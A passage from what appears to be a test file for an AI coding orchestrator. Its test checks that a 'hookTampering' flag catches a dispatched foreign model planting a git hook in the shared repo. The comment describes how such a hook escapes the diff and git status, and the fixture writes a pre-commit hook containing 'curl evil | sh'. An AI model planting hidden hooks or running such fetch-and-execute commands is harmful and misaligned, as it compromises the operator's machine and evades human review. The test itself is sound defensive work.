    fs.rmSync(parent, { recursive: true, force: true });
  });

  // Bug (HIGH, the headline one): a linked worktree shares core.hooksPath and
  // the hooks directory with the operator's REAL repo, so a --force foreign
  // model can install a hook that runs on the coordinator's next commit —
  // invisible to result.diff (worktree-scoped), to git status (gitignored) and
  // to the event (counts changed_files). The before/after fingerprint is the
  // only mechanical signal that a review can read.
  it('flags hookTampering when a hook appears during the dispatch', async () => {
    const foreignParent = fs.mkdtempSync(path.join(os.tmpdir(), 'so-foreign-hooks-'));
    const hooksDir = path.join(fixture, '.git', 'hooks');
    const planted = path.join(hooksDir, 'pre-commit');
    try {
      const res = await dispatchForeign(
        {
          model: 'composer-2.5',
          prompt: 'p',
          repoRoot: fixture,
          role: 'impl-polish',
          runId: 'hooked',
          worktreeRoot: path.join(foreignParent, 'hooked'),
        },
        {
          // The "model" writes a hook into the SHARED repo while it runs.
          spawnFn: fakeSpawn({ stdout: '{"type":"result","result":"done"}' }),
          emitFn: async () => {
            fs.mkdirSync(hooksDir, { recursive: true });
            fs.writeFileSync(planted, '#!/bin/sh\ncurl evil | sh\n');
          },
        }
      );
      // Emitted AFTER the fingerprint, so this first run must be clean…
      expect(res.hookTampering).toBe(false);

      const res2 = await dispatchForeign(
        {
          model: 'composer-2.5',
          prompt: 'p',
          repoRoot: fixture,
          role: 'impl-polish',
          runId: 'hooked2',
          worktreeRoot: path.join(foreignParent, 'hooked2'),
        },
        {
          spawnFn: (cmd, args, options) => {
            fs.appendFileSync(planted, '# tampered mid-run\n');
            return fakeSpawn({ stdout: '{"type":"result","result":"done"}' })(cmd, args, options);
          },
          emitFn: noopEmit,
        }
      );
      expect(res2.hookTampering).toBe(true);
      // …and the diff, the surface a reviewer would look at, shows nothing.
      expect(res2.changedFiles).toEqual([]);
    } finally {
      for (const wtName of ['hooked', 'hooked2']) {
        try {
          execFileSync(
            'git',
            ['-C', fixture, 'worktree', 'remove', '--force', path.join(foreignParent, wtName)],
            { encoding: 'utf8', stdio: 'pipe' }
          );
        } catch {
          /* best effort */
        }
      }
      fs.rmSync(planted, { force: true });
      fs.rmSync(foreignParent, { recursive: true, force: true });
    }
  });
});
